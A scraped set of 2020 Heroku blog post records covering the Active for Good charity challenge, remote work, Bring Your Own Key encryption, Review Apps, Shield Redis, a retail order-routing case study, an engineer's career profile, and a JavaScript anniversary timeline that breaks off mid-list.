challenge lasts for a designated period of time, such as 30 days. Most are private events. Companies will sponsor a challenge for their employees as a team-building or employee engagement initiative. Other organizations, such as churches and nonprofits also run challenges to engage their community in global issues. There are even very short-term challenges that happen within an hour or two, such as during breaks at a conference. Recently, Active for Good has started running free challenges that are open to the public. So, what do you need to do to join in? Signup and setup are a snap — you download the Active for Good app, register with the event code, and connect your fitness tracker, such as the iPhone’s health app, Fitbit, or Garmin, to the app. That’s it. The rest is entirely up to you. During the month, every minute you spend exercising earns points towards unlocking a MANA meal packet for a child. The app serves up microstories along the way to help you stay motivated, and there’s also a leaderboard for those who love to compete. Says marketing director Luke Mysse, “One of the things I love about the app is the tangible tie to the impact I’m making. The fact that I can see my activity actually unlock a meal and know that it will help a kid, that really keeps me going.” Schools in particular have taken up the challenge — and run with it. Harnessing student energy and enthusiasm for the cause, many schools not only run challenges, but also use Active for Good as part of a student development program. Student leaders set up, promote, and manage the challenge. They’ll run offbeat activities like hula-hoop contests or musical chairs, and a few will even invite teachers to compete in front of the school assembly (with hilarious results). Programs also tie in with geography classes; students research and give presentations on the countries and communities impacted by their challenge. At one high school in Canada, seniors are sharing their Active for Good projects in their capstone presentation. Kids helping kids — they don’t think about all the tradeoffs in their personal time management; they just jump in and act. There’s a lesson in there for us adults. The latest challenge: Active Together While Apart Fast forward to May 1st, which starts tomorrow! Active for Good’s latest challenge, “Active Together While Apart,” is free and open to the public. Anyone can join the challenge at any time during the month (every little bit counts); start by downloading the iPhone app or Android app . If you miss this one, no worries. Keep an eye out as more public challenges will roll out in the coming months. Wherever you are, and whatever your local situation may be during this global pandemic, you can still connect with friends, family, and others by being active together virtually or at a safe distance. At the same time, you can connect with a child and a community on the other side of the world through your impact. Personally, I look forward to seeing how much I can contribute. We invite you, your family and friends, and anyone in the Heroku community, to join Team Heroku in this upcoming Active for Good challenge. See you on the leaderboard! Read about our team’s impact after participating in a recent activity challenge: 161 Lives Saved (and Counting) — Team Heroku Steps Up to Help Feed Malnourished Kids . Listen to the Code[ish] podcast featuring Troy Hickerson and Luke Mysse: Special Episode — Active for Good. doing good charity", "date": "2020-04-30,"},
{"website": "Heroku", "title": "Climbing Up The Walls:  (Not) Remotely Business As Usual", "author": ["Charlie Gleason"], "link": "https://blog.heroku.com/climbing-up-the-walls", "abstract": "Climbing Up The Walls:  (Not) Remotely Business As Usual Posted by Charlie Gleason May 29, 2020 Listen to this article We are living in unprecedented times, and many of us are grappling with a really similar set of complicated and, at times exhausting, emotions. I've been thinking about this a lot since my conversation with Margaret Francis, the SVP of Platform Data Services at Salesforce and former Heroku GM, in our recent podcast for Code[ish] . At Heroku, we have gone from roughly over half of our team being remote, to all of our team being remote. We, along with people all over the world, have suddenly found ourselves working from living rooms, laundry rooms, gardens, garages, sheds, and kitchens. It can be overwhelming at times—learning new skills and adjusting old ones—so we wanted to step back and celebrate the unique ways we’re all coping. I wanted to revisit the idea of sharing our spaces, work and otherwise, to hopefully make us all feel a little less alone. Here are some examples of how the team has adjusted, and coped, in the new normal. This post is a follow on to our previous post on a similar theme, On Making Work Less Remote . It is also related to the podcast “ Books, Art, and Zombies: How to Survive in Today's World ”, in which Charlie Gleason and Margaret Francis discuss the ways in which they're keeping hope and happiness alive with their families. Herokai remote work", "date": "2020-05-29,"},
{"website": "Heroku", "title": "Bring Your Own Key for Heroku Managed Data Services Is Now Generally Available", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/heroku-byok", "abstract": "Bring Your Own Key for Heroku Managed Data Services Is Now Generally Available Posted by Scott Truitt May 06, 2020 Listen to this article Security is always top of mind for Heroku customers; COVID-19 has further increased the urgency for enterprises and developers to deliver more mission-critical applications with sensitive and regulated data. Given the needs of our customers, including those in regulated industries like Health & Life Sciences and Financial Services, we are thrilled to announce that Heroku Private Spaces and Shield customers can now deploy a new Postgres, Redis, or Apache Kafka service with a key created and managed in their private AWS KMS account. With BYOK, enterprises gain full data custody and data access control without taking on the burden of managing any aspect of the data service itself. This feature is available on all Private and Shield data plans, starting today, at no additional cost, outside of any cost associated with AWS KMS. Those customers who choose not to use BYOK will still have their Heroku Data services encrypted with a key that we own and control. There is no change to the current experience or features. Developed with Enterprise Security in Mind Enterprises are increasingly thinking about the threat of a compromise to their data and data services. Many of our most progressive and security-conscious enterprise customers asked us for a “kill switch” that can prevent anyone from accessing their data and data service, even their own employees or us, upon request. Late last year, we began engaging with these customers to understand their views on data security and validate our designs for a BYOK option. Moneytree had a compelling business need and a deep technical understanding of how they wanted it to work. Their guidance was instrumental in the feature set and experience released today: “Moneytree uses Heroku’s new BYOK feature to meet the security and compliance requirements of our Financial Institution clients. The simplicity of it kept our team’s overhead down while meaningfully improving our security.” — Ross Sharrott, Chief of Technology and Founder, Moneytree Designed to Share Responsibility Seamlessly Enterprises create the key and manage the full lifecycle in AWS KMS. To use a key with a new Heroku Data service, copy the key’s ARN from the AWS CLI or Console, and then pass the ARN when creating a new add-on in the Heroku CLI: $ heroku addons:create heroku-postgresql:shield-0 --app sushi --encryption-key [arn:aws:kms:...] See the Dev Center articles for encrypting a new Heroku Postgres database with your encryption key and migrating an existing Postgres database to one using your own encryption key , as well as Heroku Redis and Apache Kafka on Heroku . Once we receive the provisioning request, we encrypt all data stored at rest  (including backups) with the encryption key. Forks and followers inherit this key too. Our Managed Data Services work the same as before, with minor limitations . As part of incident response or breach containment playbook, enterprises can revoke access to the key in the AWS CLI or Console. Within minutes, Heroku detects it, shuts down all data services that use the key, and stops all servers that run those services. Data in the database(s) and the backup file(s) are inaccessible, no one can access them without the key, but no data is deleted or lost. Properly coded apps can detect this as downtime and go into maintenance mode. When the threat has passed, enterprises can restore access to the key in the AWS CLI or Console. Within minutes, Heroku detects it and brings everything back online. All apps work as before without intervention. Note that we do not store the Customer Master Key (CMK) from AWS KMS or deal with its management in any way. We gain access to it at the time of creation. We periodically check its status and act when needed. Built with the Strengths of Heroku and AWS Like our previous Private Link integrations , this integration combines the strengths of Heroku and AWS into a simple and straightforward developer experience. BYOK is another step forward for our combined investments in developer agility and enterprise security. We can’t wait to see all our customers using it. Please send any feedback our way. Want to learn more about Bring Your Own Key for Heroku Managed Data Services? Contact sales redis kafka postgres CMK KMS AWS data services heroku bring you own key", "date": "2020-05-06,"},
{"website": "Heroku", "title": "161 Lives Saved (and Counting): Team Heroku Steps Up to Help Feed Malnourished Kids", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/team-heroku-steps-up", "abstract": "161 Lives Saved (and Counting): Team Heroku Steps Up to Help Feed Malnourished Kids Posted by Sally Vedros June 10, 2020 Listen to this article Yesterday, I took my rusty old bike out of the basement and rode through Golden Gate Park to Ocean Beach and back. The 6+ mile ride may seem short to some, but for me, it was something I never thought I’d be doing just a short time ago. I’m on a roll (literally!) that started at the beginning of May when I joined the “Active Together While Apart” activity challenge. As I wrote about in my earlier blog post , Heroku customer Active for Good is working to fight severe acute malnutrition in children around the world with a unique program here in North America. The organization runs activity challenges that inspire people to get more exercise, and simply by doing so, contribute to their cause. This means that for every minute of activity, participants generate points that unlock lifesaving meals for malnourished kids. What better motivation to help oneself than to also help others in the most fundamental way. Doing so with friends adds fun into the mix, especially during these pandemic times when many of us feel so isolated. Teams get active together Active for Good is designed for teams. The organization offers sponsorship opportunities to companies, nonprofits, churches, schools — any group that wants to run a private challenge and engage their own community in health initiatives or global issues. Students in particular have embraced the activity challenge as part of school projects, senior presentations, extracurricular activities, and even the time-honored tradition of embarrassing their teachers on stage. The challenge format is simple enough that moderators can truly get creative with their events. Recently, Active for Good has started running public challenges that are open to everyone for a designated period of time (typically one month). They are free to join, and anyone can start a team or join a team. Leaderboards keep the competition lively, and the mobile app UI and notifications keep participants engaged with their progress. Go Team Heroku! During May, Team Heroku entered the “Active Together While Apart” public challenge, ready to get seriously busy. Our team grew to 43 members strong, each contributing their personal minutes to an overall pot that unlocked a whopping 1,314 RUTF ( Ready to Use Therapeutic Food ) packets for needy children. We placed 7th in the region, which also reflected our collective hard work. I’d like to give a shout out to my colleague Van Bach and her husband Eduardo for leading the charge. Van placed #5 in the Team Heroku rankings, and Eduardo placed #1! Van describes the challenge as the extra motivation she needed to push herself: “The Active for Good app is such a fun, low effort way to help make a difference. I love that the integration with my fitness device is seamless and I don't have to think about it. My husband and I both use the app and we find the ranking system a great motivator for friendly competition. It really made a difference between deciding to slack off for the day, or to power through it and climb one more spot!” Special thanks to another colleague, Summer Bolen, who helped raise awareness at Salesforce by sharing her experience on our internal Chatter channel. For Summer, the competition aspect was a welcome surprise and added fuel to her motivation: “I never knew I was so competitive, but seeing myself on the bottom of the leaderboard definitely lit a fire and has helped hold me accountable to stay active throughout my days. My favorite way to earn points: hiking, yoga, house cleaning, and meditation (worth the most points!).” Onwards to the June challenge The latest Active for Good public challenge started this week, and Team Heroku is already racking up points. Incidentally, at the time of writing, Eduardo is in the #1 spot. Challenge anyone? We invite you to join the June challenge “Hello Summer!” and get active with us. You can start at any time during the month and your activity can be added retroactively. By being active together in May, the combined efforts of all teams donated 24,214 meals that saved the lives of 161 children suffering from severe acute malnutrition. What a profoundly satisfying accomplishment! For me, it made every breathless step up San Francisco’s neighborhood hills, every Zoom dance class and yoga session, every late-night house cleaning frenzy, and now, every pedal of my old bike, totally worth it. Learn more about Active For Good's impact , how their public activity challenges fight malnutrition , or join their latest activity challenge . Listen to the Code[ish] podcast featuring Troy Hickerson and Luke Mysse: Special Episode — Active for Good. doing good giving back charity", "date": "2020-06-10,"},
{"website": "Heroku", "title": "Announcing New Review Apps: Expanded Options for Greater Control, Automation, and Easier Access", "author": ["Sepideh Setayeshfar"], "link": "https://blog.heroku.com/heroku-new-review-apps", "abstract": "Announcing New Review Apps: Expanded Options for Greater Control, Automation, and Easier Access Posted by Sepideh Setayeshfar June 16, 2020 Listen to this article Faster application delivery with remote teams is the key to connect with your customers, now more than ever. A few years ago, we released Review Apps with the goal of improving the application development process and team collaboration. Today, we are excited to announce the release of an improved version of Review Apps to general availability. The new version of Review Apps provides easier access management with a new permission system, and more flexibility for complex workflows with public APIs. It also no longer needs a staging, production, or placeholder app to host its configuration and collaborator access; this independence supports easier, more flexible application development. Review Apps are disposable applications that spin up for each pull request in GitHub. They make it possible for development teams to build and test any pull request at a temporary shareable URL before merging changes back to production. Improved Security and Control with Flexible URL Patterns Review Apps have their own URL which makes it possible to share the result of latest code changes across your development team for feedback. Review app URLs can also be shared with contractors or clients outside your company, if you need to, so they can review and approve designs and features before merging the pull request and deploying to production. With the new version of Review Apps, it’s possible to select between a random or predictable URL. While the random URLs can provide better security, there are many use cases where you might need a predictable URL pattern. It’s even possible to have your own identifier as part of the predictable pattern, so you can easily distinguish between Review Apps in different pipelines or development environments. Supporting Automation & Complex Workflows The new Review Apps API makes it easier to use Review Apps in workflow automations in combination with other tools and products. Since review apps can now be accessed via the API, you can also control them from CI tools other than Heroku CI. Review Apps API is an extension of Heroku’s Platform API which allows enabling, disabling, creating, and deleting Review Apps. This new version makes it possible to enable Review Apps in multiple pipelines for the same repository, which in combination with the API flexibility can cover more complex workflows and use cases. Also, the new Review Apps are no longer dependent on staging, production, or placeholder apps for collaborators access and configurations. So, a staging app can now be strictly a staging app, without also being used as a source of configuration for Review Apps. This enables easier applications development and makes it possible for customers to not create a staging app if it’s not part of their workflow. Easier Access Management A new pipeline permission layer will now bring more visibility and an easier way to manage access to ephemeral apps. You will have the option to get all users with the “member” permission in the Enterprise Teams and Heroku Teams automatically added to this table and given access to the Review Apps within the pipeline. For collaborators, and other users in your Heroku Enterprise Team, Heroku Team or personal account that can’t be added with auto-join, you can add them manually. For Enterprise Teams you will have the option to select and modify detailed permissions. For Heroku Teams and personal accounts, users inherit the hard coded permission sets. If you are using the older version of Review Apps, it’s very simple to upgrade to this new version , and we highly encourage it so you can benefit from all the improvements. New users of Review Apps will get started on this new version automatically. Feedback welcome We hope you enjoy using the new version of Heroku Review Apps. Please visit the Review Apps (New) Dev Center article for more information. Your feedback is highly valuable, please write to us via the “Give us feedback” button above the Review Apps column of your pipeline. heroku API Heroku CI Pipelines Heroku Flow collaboration dev exp Review Apps", "date": "2020-06-16,"},
{"website": "Heroku", "title": "A Pandemic Tale: How a Simple Algorithm Brought a Business Back from Lockdown", "author": ["Ryan Townsend"], "link": "https://blog.heroku.com/a-pandemic-tale", "abstract": "A Pandemic Tale: How a Simple Algorithm Brought a Business Back from Lockdown Posted by Ryan Townsend October 20, 2020 Listen to this article Sometimes, innovation is born in the midst of a crisis. Unexpected challenges and a sense of urgency force companies to look for new ways of keeping the business going, even as the odds stack up against them. This was the case for one of our biggest customers Matalan , a major fashion and homeware retailer in the U.K. The company operates 230 brick and mortar stores across the country, and 30 international franchise stores within Europe and the Middle East. It also maintains a thriving online channel that runs on the SHIFT platform . When the global coronavirus pandemic hit, the U.K. government mandated that retailers like Matalan close their physical stores to help prevent the spread. It was a moment of crisis for both the company and its 13,000 employees. Matalan was forced to furlough 90% of its workforce, and no one knew when the business might be able to return to normal operations. An e-commerce surge brings new challenges On the digital side of the business, Matalan's e-commerce site was still operational, of course, and growing as rapidly as other online retailers during this time. As people found themselves stuck at home, they were spending far more money online than ever before as they stocked up on basic items or had more time to discover new products. This put tremendous pressure on the company's distribution centers, which struggled with the surge in volume. Weeks of online orders had created a daunting backlog that the center couldn't process fast enough. Although customers understood that this was pandemic-related, there was a chance that they'd become too frustrated to return in future, posing yet another serious risk to the business. Matalan's distribution centers also faced yet another unknown --- the U.K. government could shut down such centers at any time due to increasingly strict social distancing rules. The company's current safety efforts meant that fewer workers could be on the job each day. This only further increased the enormous backlog and threatened the viability of the online business. All of this meant potentially thousands and thousands of jobs could be lost. Although Matalan is a large enterprise, the pandemic brought unprecedented business challenges, and while companies of this scale have \"rainy day funds,\" cash flow is managed very carefully and there's only so far that they can stretch their resources. We've always had a great partnership with Matalan, so when they shared their concerns with us, we wanted to find a way to help them out. We understood their goals to be: Continue selling online as much as possible to serve their customer base. Offset the revenue lost by physical stores that were temporarily closed. Relieve the burden on distribution centers. Raise funds that could be used as a safety net to protect jobs. Reimagining stores as distribution centers A few years ago, our CEO sat on the board at Matalan, and he had initiated a project to install RFID tags on all of the company's products. Unlike traditional barcodes, these tags would enable someone to walk around the store with an RFID reader and record each product currently sitting on the shelves. They could then generate a stock report easily and with far greater accuracy. This existing \"infrastructure\" gave us an idea. If we knew the current inventory at each store, could we determine whether an online order could be fulfilled by one of those stores? As there were no customers coming in, the stores were in effect small warehouses. We just needed to connect the dots. From good idea to working proof of concept — in one week We kicked off the project by building a proof-of-concept algorithm that would run the logic needed based on things like the customer's order, their chosen payment/shipping methods, or the inventory at RFID-enabled stores. If the items could be packaged and shipped by a local store, great. If not, then the order would go to a distribution center. Part of our process was to work with the stores to analyze how fulfillment could be done efficiently. We went around with a trolley, picking the items to be shipped, and looking for ways to optimize the flow. Would it be better for someone to collect items for one order at a time, or for multiple orders? We were able to factor this into the algorithm, so that stores wouldn't become as overwhelmed as the distribution centers. All in all, it took our team a week to take the concept from an idea to a production-ready proof-of-concept app on Heroku. Most of this time, we were tracking down data in various systems. But once we got access to the data, it was relatively straightforward to build and deploy our app. As time was of the essence for Matalan, the speed and ease of deploying to Heroku was a great advantage. If we'd had to do all our own DevOps work, spin up servers and such, it would have taken us much longer to get the solution out the door. Furloughed employees return as stores get ready to ship To test our concept, we double-routed every online order for a period of time through both the traditional fulfillment path and our new algorithm that pointed to a selection of about a hundred stores. We were able to simulate what would happen with real production data without disrupting the real order flow. Fairly quickly, we could see that it was possible to offload the majority of e-commerce orders to the stores. That's when things really ramped up. Soon, the remaining pieces of the fulfillment puzzle started falling into place. Matalan brought back furloughed employees to ten stores at first, and more as time went on. They set up stores with label printers, couriers, and other equipment and services needed to ship products. And in four to six weeks, their fleet of new mini-distribution centers was up and running. Ready to ship a million orders per day Since our new solution rolled out, we've seen an increasing volume of online orders that are routed in complex ways. But our app has held steady throughout, as Heroku enables us to scale seamlessly with demand. In addition, everything is lightning fast --- our API responds in ~20ms, and our routing jobs take ~100ms. This gives us the capacity to route almost a million orders per day and still provide a great experience for Matalan customers. All with minimal performance optimization. Our ecosystem was a critical success factor We believe that one of the keys to our project's success is that we leveraged our existing ecosystem, which was flexible and ready to adapt. The SHIFT platform is completely API-driven with webhooks that make it easy to route orders. We use all three Heroku data services : Heroku Postgres for storing stock data, Heroku Redis for queuing and calculation, and Apache Kafka on Heroku for streaming data into our order management system. We also use familiar Heroku Add-ons , like Coralogix and Heroku Scheduler . Heroku's PCI compliance also meant that we didn't have to worry about the security of our infrastructure. Because we'd already invested in our architecture, we could bolt on a new service like the Matalan app with next-to-zero effort. A quick fix during a crisis becomes a long-term solution As the months rolled by and pandemic rules changed, Matalan saw more ways to use our algorithm. They've been able to improve their \"click and collect\" model, which allows customers to place an order online and pick up the items in person at a store. Before, these orders would be shipped from a distribution center to a store (which may already have those items in stock). Now, they can route these orders directly to the collection store, and stores can actually pick and pack those orders directly in the store. This results in significant cost savings for Matalan. It allows them to scale to accept more online orders and also saves time for customers --- a true win-win. We don't know when the pandemic will end, but we do believe that Matalan is in a better position now than before the crisis began. If a second wave happens, or a new pandemic arises, they have a mechanism in place to keep the business going and keep their people employed. We see it as a long-term risk management solution that they can fine-tune as they go along. It just goes to show how one simple algorithm can make a huge difference to a business' future. Read the SHIFT Commerce case study to learn more about SHIFT on Heroku. Listen to a special episode of the Code[ish] podcast featuring Ryan Townsend: Scaling Businesses During a Pandemic . distribution Retail ecommerce algorithms", "date": "2020-10-20,"},
{"website": "Heroku", "title": "Heroku Shield Redis Is Now Generally Available", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/announcing-shield-redis", "abstract": "Heroku Shield Redis Is Now Generally Available Posted by Scott Truitt June 11, 2020 Listen to this article We are thrilled to announce that Heroku Shield Redis is now generally available and certified for handling PHI, PII, and HIPAA-compliant data. Heroku Shield Redis is the final missing data service for Heroku Shield, which is an integrated set of Heroku services with additional security features needed for building high compliance applications.  All Heroku Managed Data Services — Heroku Connect, Heroku Redis, Heroku Postgres, and Apache Kafka on Heroku — are now fully certified for handling PHI, PII, and HIPAA-compliant data as part of Heroku Shield. Security and compliance come standard with Heroku Shield, so developers and enterprises can focus solely on building great experiences. In this new age of COVID-19, we know that developer agility and data security are critical concerns for anyone delivering apps with sensitive or regulated data. But the need to move fast is second only to the need to maintain security and compliance. Our customers in regulated industries like Health & Life Sciences and Financial Services continue to push us in this direction and have informed our roadmap for years. Heroku Shield Redis continues our ongoing investments in secure, compliant features like Bring Your Own Key , services like Apache Kafka on Heroku Shield , and external integrations over Private Link and mutual TLS . Build Real-Time Apps with Secure Data, More Easily than Ever Developers love Redis for its unique ability to deliver sub-millisecond response times and handle millions of operations per second. Its use cases range from well-known to emerging: Caching: Some data needs to be accessed quickly and very often. This is the sweet-spot for Redis. Database : Optional persistence makes Redis an attractive option for more than interacting with hot data in-memory. Job Queues: Queues are used extensively in web development to separate long-running tasks from the normal request-response cycle of the webserver. Session Storage: Every web app that wants to track users needs to store session information because HTTP is a stateless protocol. Redis makes a great data store for session data because of its high-performance characteristics. Leaderboard : Redis allows any interactive app with a count of up/down votes or a game with a scoring component to track real-time changes across a large body of users. Message Broker : Like the Leaderboard example, Redis functions as a lightweight and elegant pub/sub engine for broadcasting messages to one or more channels. Heroku Shield Redis makes these features and benefits available for developers working with sensitive and regulated data. What makes Heroku Shield Redis possible are the additions and improvements in Redis 6, in particular, the new ability to encrypt traffic with TLS natively. TLS is mandatory and enforced on all Shield plans (and Premium and Private plans with Redis 6). Heroku Shield Redis runs the same foundation we use to protect our platform. Security is the goal and end-result of our excellence in engineering, and our compliance program verifies and ensures full-credit for the controls we both need in the shared responsibility security model. Heroku Shield Redis is available in all six Heroku Shield Private Spaces regions: Dublin, Frankfurt, Sydney, Tokyo, Virginia, and Oregon. PCI compliance for Heroku Shield Redis is due in the fall of 2020. Creating your Heroku Shield Redis database is as simple as adding the service to a Heroku app in the Heroku Dashboard or CLI: $ heroku addons:create heroku-redis:shield-7 -a sushi-app About Heroku Shield Heroku Shield , first released in June 2017, brings the power and productivity of Heroku to a whole new class of strictly-regulated apps. The outcome is a simple, elegant user experience that abstracts away compliance complexity while freeing development teams to use the tools and services they love. Heroku Shield Postgres, also released in June 2017, guarantees that data is always encrypted in transit and at rest. Heroku also captures a high volume of security monitoring events for Shield dynos and databases, which helps meet regulatory requirements without imposing any extra burden on developers. Heroku Shield Connect, first released in June 2018, enables the high performance, fully-automated, and bi-directional data synchronization between Salesforce and Heroku Shield Postgres — all in a matter of a few clicks. Apache Kafka on Heroku Shield, first released in November 2019, provides all the power, resilience, and scalability of Kafka without the complexity and challenges of operating or securing your clusters. About Heroku Redis Heroku Redis is the key-value data store you love, with the developer experience you deserve. Feedback Welcome Redis 6 opens a new frontier of development for our customers and us. We look forward to seeing what you can do with it and expect to support more of its new features in the months to come. Existing Heroku Shield customers can get started with Heroku Shield Redis today . All developers can upgrade to Redis 6 today too. For more information, see the Dev Center articles for Heroku Shield or Heroku Redis , or contact Heroku. Please send any feedback our way. Want to learn more about Heroku Shield Redis? Contact sales data services HIPAA compliance security data postgres kafka redis Shield", "date": "2020-06-11,"},
{"website": "Heroku", "title": "When Serendipity Strikes: How One Engineer Turned His First Coding Gig into a Decade-Plus Career", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/when-serendipity-strikes-engineering-career", "abstract": "When Serendipity Strikes: How One Engineer Turned His First Coding Gig into a Decade-Plus Career Posted by Sally Vedros December 03, 2020 Listen to this article For many of us, changing jobs seems like the best way to grow professionally or advance our careers. Not so for Edd Morgan , Senior Director of Engineering at BiggerPockets . During his first year in college, he became the startup’s first employee. Twelve years later, Edd reflects on his unusually stable career path and how he’s helped to grow the company into a thriving business with two million users. It all started with a part-time job In 2008, Edd began studying computer science at the University of Bournemouth in the U.K. Like many college students, he needed to find a way to make money for rent and living expenses. Edd came across a job posting from a startup that needed some programming help, and he thought, “Why not apply?” He says, “It seemed cool to be paid for doing this thing that I was doing all the time as a hobby, which is programming and making websites.” Back then, he didn’t consider this decision to be a first step on a formal career path. It was only to be a short-term, convenient solution to pay the bills while in school. Little did he know that the job would offer Edd so much more. “It’s kind of funny, and surprising, that I got my ‘life job’ before I even left college.” The early days at BiggerPockets In 2004, Josh Dorkin wanted to get into real estate investing, but he quickly found that the industry was fraught with scams and “get rich quick” schemes. He couldn’t find a good source of reliable information anywhere, so he did what entrepreneurs do: he started his own thing. BiggerPockets launched as a simple community forum for people to share their real estate investment knowledge and experience. By the time Edd joined, BiggerPockets had grown to serve a couple of thousand users. Josh needed help with taking the site to the next level — from forum posting to a more interactive, integrated experience that could also be monetized. At that time, Facebook had taken the world by storm, and social networks had become the new way to build community. Josh envisioned that the expanded BiggerPockets platform would allow investors to build friendships and network with each other, as well as access the lenders, agents, and other services needed to make a successful deal. Josh and Edd got started on this vision from different sides of the planet. As Josh was in Colorado, and Edd in the U.K., they would open up a Skype call and just work side by side for eight hours, mostly in silence, to simulate a shared office space. Edd says, “I didn’t meet Josh face-to-face until about five years ago, which is pretty crazy.” Edd continued as the only engineer at BiggerPockets for the first few years. At a certain point in the company’s growth, it was time to also grow the team. “We found our first engineer in the same way Josh found me,” says Edd, “And he stuck around for a very long time. We wanted to find people that we could get along with since we’d be working together so closely.” From employee number one to head of engineering Fast forward a few more years, and today, Edd leads a team of 13 engineers. His own career trajectory has come as a bit of a surprise to him. “When I was younger, I never saw myself becoming a director of anything. But by staying at the company for so long, it’s forced me into a leadership role that I have gladly embraced. I feel lucky to have learned so much in this role.” Most engineers are located at the company’s headquarters in Denver, Colorado, but a few are remote like Edd. Typically, he travels to Denver every quarter to get some face time with his team, but the global pandemic has made that difficult this year. So, Edd and team have had to get creative with maintaining the team’s culture. One of their first experiments was to schedule “water cooler time” over Zoom, however it felt too much like forced social interaction. Adding a purpose to the gathering made all the difference. Now, the team meets regularly to discuss a particular problem or to do some group coding together, and the socializing in between feels more natural. Many important lessons learned along the way Learning on the job can bring both pitfalls and opportunities. “We’re still dealing with the consequences of some decisions I made ten years ago,” Edd says. “There are definitely a lot of things that I would say to a much younger me.” Some of those lessons have come out the fire of experience and others from industry thought leaders: A team is a network of brains. Going from one engineer to a team of many requires a shift in mindset. The problems are no longer purely technical; organizational and people problems arise as well. Edd refers to Jean-Michel Lemieux , CTO of Shopify, who thinks of his engineering team as a network of brains. “As a leader, you want to optimize communication across that graph of brains, each with a million edges that could connect with others,” says Edd. “And it’s a hell of a lot harder than writing code.” Less is more. To Edd’s younger self, every business challenge could be solved with the right code. He’d ask himself: “What software can I bring into the world to solve this problem?” However, that approach didn’t always take into account the full scope or nature of the problem. Now, Edd tries to “get out of his own way” and focus on the bigger picture. “I say ‘no’ to more things and try to work out what’s the best direction for the product. And that’s not always about writing more code.” Product management is a thing. As Edd began to focus more on the product, he had to make decisions that straddled both product management and engineering management. It wasn’t until the company began hiring dedicated product managers that he fully understood the role. “It is a different way of thinking: why are we writing this code? Why work on this and not something else? Those questions were always in the back of my head, but I didn’t act on them in the early years.” Innovation is expensive. Part of saying “no” to more things is the realization that time and resources are limited — and precious. Edd is inspired by Dan McKinley , who introduced the concept of “innovation tokens” as engineering currency. Every company has a set amount of tokens which can be spent in any way. “We have to be very intentional and spend our tokens wisely, so we’re always focusing on the right things. In the early days, we spent them like crazy and probably went into innovation token debt!” Today, product discovery is a requirement at BiggerPockets before significant time or energy goes into something new. The team leverages zero code solutions, like user feedback and data, to help them make decisions, rather than relying purely on assumptions. “In this way, we’ve become less of a stakeholder-driven company, and more of a product-driven, or even customer-driven, company.” The day the database crashed For the first six years, BiggerPockets managed its own infrastructure that was located at a data center in California. One day, Josh called to report that the site was down. Edd looked into it, called the data center, and found that the database server had crashed due to a failure in one of the RAID controllers. The prognosis was bad. “They told us: ‘You’d better have some backups.’ Then, I realized that our most recent backup was six months old.” It was the most stressful day of his career. “We had three engineers at the time, and it wasn’t anyone’s official responsibility to do all those backups because we did not see ourselves as an infrastructure engineering company. We’re a product engineering company, and we didn’t know it until this happened.” New lessons learned on Heroku Luck was on their side, and the data center was able to recover the data (after a full 12 hours of downtime). But this was a major wake up call, and Edd was determined to not let it happen again. BiggerPockets is primarily a Rails app, and Edd understood that Heroku was the best platform for running Ruby apps. The team decided to spin up a copy of the app on Heroku, with data living in Heroku Postgres , to see how it worked. They tested the two apps in parallel for a couple of days, and the Heroku app performed flawlessly, so they moved the domains over. “It was a very smooth process, and we haven’t looked back since.” Now, Edd and team can leave the infrastructure worries behind them and truly focus on being a product engineering company. The road ahead to 2021 and beyond For lots of businesses, the global pandemic and recession in 2020 made it a tough and confusing year to navigate. But the BiggerPockets team are excited to come out of it with a greater sense of purpose and direction. They’ve even begun hiring again, opening a front-end engineer role to help them with plans for mobile apps in 2021. When Edd thinks about his own career path over the next five years, two things come to mind. First, he wants to grow the team so that this thing that he's been working for so long can reach its full potential. Edd looks forward to expanding the platform with new capabilities, such as big data and analytics, that can help customers make even better investment decisions. Secondly, as his team builds exciting new features, Edd wants to be coding along with them. In between his management duties, he still writes code on a weekly basis and actually sits on one of the project teams. “I never want to lose touch with actually building stuff, because that's why me (and lots of other nerds) get into this industry. There are companies larger than us where the CTO writes code. It doesn't prohibit you being hands on in a leadership role, and I think in some cases it should be mandatory.” Leadership career", "date": "2020-12-03,"},
{"website": "Heroku", "title": "Celebrating 25 Years of JavaScript", "author": ["Danielle Adams"], "link": "https://blog.heroku.com/celebrating-25-years-of-javascript", "abstract": "Celebrating 25 Years of JavaScript Posted by Danielle Adams December 04, 2020 Listen to this article JavaScript turns 25 years old today. While it’s made an impact on my career as a developer, it has also impacted many developers like me and users around the world. To commemorate our favorite language, we’ve collected 25 landmark events that have shaped the path of what the JavaScript ecosystem looks like today. 1995 1) JavaScript is created In 1995, Brendan Eich, a developer at Netscape, known for their Netscape browser, was tasked with building a client-side scripting language that paired well with Java. While it may not be the language that you know and love today, JavaScript was written in 10 days with features we still use today, such as first-class functions. 1997 2) ECMAScript is released Despite JavaScript being created 2 years before, there was a need to create open standards for the language if it would be used across multiple browser types. In 1997, Netscape and Microsoft came together under Ecma International to form the first standardization of the JavaScript language, resulting in the first iteration of ECMAScript. 1999 3) Internet Explorer gets an early XMLHTTP Object Some will recall using iframe tags in the browser to avoid reloading a user’s page with a new request. In March of 1999, Internet Explorer 5.0 is shipped with XMLHTTP , a browser API that could enable developers to take advantage of background requests. 2001 4) JavaScript gets its own data format In 2001, JSON was first introduced via json.org . In 2006, an RFC proposing JSON, JavaScript Object Notation, was opened for review with the proposal of more than one type of HTTP call to fulfill a website: one that would fulfill a browser’s needs and the other would provide application state. Thanks to its simplicity, JSON would gain traction as the standard and continues to be used today. ( Source ) 2005 5) Shifts towards AJAX After other browsers followed Internet Explorer in supporting background requests for updating clients without reloading pages, a researcher penned the term as Asynchronous JavaScript and XML, or AJAX, highlighting the shift in web development and JavaScript to asynchronous code. ( Source ) 2006 6) First publicly released Developer Tools With more complexity being enabled in the browser, there was a need for tooling to keep up. Firebug was created in 2005 as the first Developer Tool to debug in Mozilla’s Firefox browser. It was the first piece of tooling that provided developers the ability to inspect and debug directly from the browser. ( Source ) 7) jQuery is released jQuery can be considered the pioneer of what we know today as modern front-end web development, and it has gone to influence many libraries and frameworks today. At its height, being a JavaScript developer and being a jQuery developer were interchangeable. The library extends the JavaScript language to easily create single-page applications with DOM-traversal, event handling, and more. 2008 8) Creation of V8 As websites went from HTML pages to JavaScript applications, it was imperative that the browsers hosting these applications keep up. From 2007 to 2010, many browsers made major releases to keep up with the growing demand from JavaScript compute power. When Chrome was released, the browser’s JavaScript engine, V8, was released as a separate project. V8 was a landmark project with Its “just-in-time” compiler and would be used in future projects as a reliable and fast JavaScript runtime. 9) 